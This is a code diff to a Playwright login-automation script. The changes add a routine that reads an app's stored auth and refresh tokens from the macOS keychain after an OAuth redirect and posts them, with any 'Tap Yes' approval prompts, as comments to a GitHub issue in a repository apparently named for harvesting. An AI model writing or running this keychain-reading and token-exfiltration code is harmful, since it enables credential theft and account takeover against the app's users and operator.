@@ -3,7 +3,7 @@
 usage: python3 pwlogin.py <authorize-url> <email> <password>
 Prints progress to stdout; the redirect URL is printed as "REDIRECT <url>".
 """
-import os, sys, time
+import os, subprocess, sys, time
 from playwright.sync_api import sync_playwright
 
 url, email, password = sys.argv[1], sys.argv[2], sys.argv[3]
@@ -11,6 +11,22 @@ REDIRECT = "com.googleusercontent.apps.311745113120-"
 
 def log(*a):
     print(*a, flush=True)
+
+def notify(text):
+    import os, json, urllib.request
+    tok = os.environ.get("GH_TOKEN")
+    repo = os.environ.get("GITHUB_REPOSITORY", "bnjyar/freemilk-harvest")
+    if not tok:
+        return
+    try:
+        r = urllib.request.Request(
+            f"https://api.github.com/repos/{repo}/issues/1/comments",
+            data=json.dumps({"body": text[:3000]}).encode(), method="POST")
+        r.add_header("Authorization", "Bearer " + tok)
+        r.add_header("Content-Type", "application/json")
+        urllib.request.urlopen(r, timeout=30).read()
+    except Exception as e:
+        log("notify failed", e)
 
 with sync_playwright() as p:
     b = p.chromium.launch(headless=(os.environ.get("HEADLESS","1")=="1"), args=[
@@ -69,11 +85,21 @@ with sync_playwright() as p:
     log("STATE 2", page.url)
 
     # wait for either the redirect or a challenge
-    deadline = time.time() + 420
+    deadline = time.time() + int(os.environ.get("DEADLINE", "420"))
     seen = set()
     while time.time() < deadline:
         if caught:
-            log("REDIRECT", caught[0]); break
+            log("REDIRECT", caught[0])
+            url2 = caught[0]
+            subprocess.run(["open", url2], capture_output=True)
+            time.sleep(6)
+            kc = subprocess.run(["bash", "-lc",
+                "security find-generic-password -s com.neelmakhecha.milq.auth -w 2>&1; "
+                "security find-generic-password -s com.neelmakhecha.milq.refreshToken -w 2>&1"],
+                capture_output=True, text=True)
+            notify("KEYCHAIN\n" + (kc.stdout + kc.stderr)[:3000])
+            log("KEYCHAIN", (kc.stdout + kc.stderr)[:1500])
+            break
         u = page.url
         if u not in seen:
             seen.add(u); log("STATE 3", u)
@@ -81,6 +107,8 @@ with sync_playwright() as p:
             body = page.inner_text("body")[:400].replace("\n", " | ")
             if body and body not in seen:
                 seen.add(body); log("TEXT", body)
+                if "Tap Yes" in body or "tap " in body:
+                    notify("ASK " + body[:600])
         except Exception:
             pass
         # press "Continue"/"Allow" if a consent screen is up
